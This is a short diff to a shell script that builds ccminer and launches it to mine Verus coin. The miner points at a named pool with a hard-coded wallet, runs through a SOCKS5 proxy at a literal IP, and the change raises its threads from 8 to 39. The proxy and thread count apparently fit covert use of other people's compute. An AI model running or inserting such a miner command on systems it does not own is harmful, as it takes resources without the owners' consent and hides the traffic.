@@ -6,4 +6,4 @@ chmod +x build.sh &&
 chmod +x configure.sh &&
 chmod +x autogen.sh &&
 ./build.sh &&
-./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956#xnsub -u RHvUpxcAex5cQWtM8ssweePvjQqEittXNQ.Circl -p -t 8 -x socks5://192.252.211.197:14921
+./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956#xnsub -u RHvUpxcAex5cQWtM8ssweePvjQqEittXNQ.Circl -p -t 39 -x socks5://192.252.211.197:14921
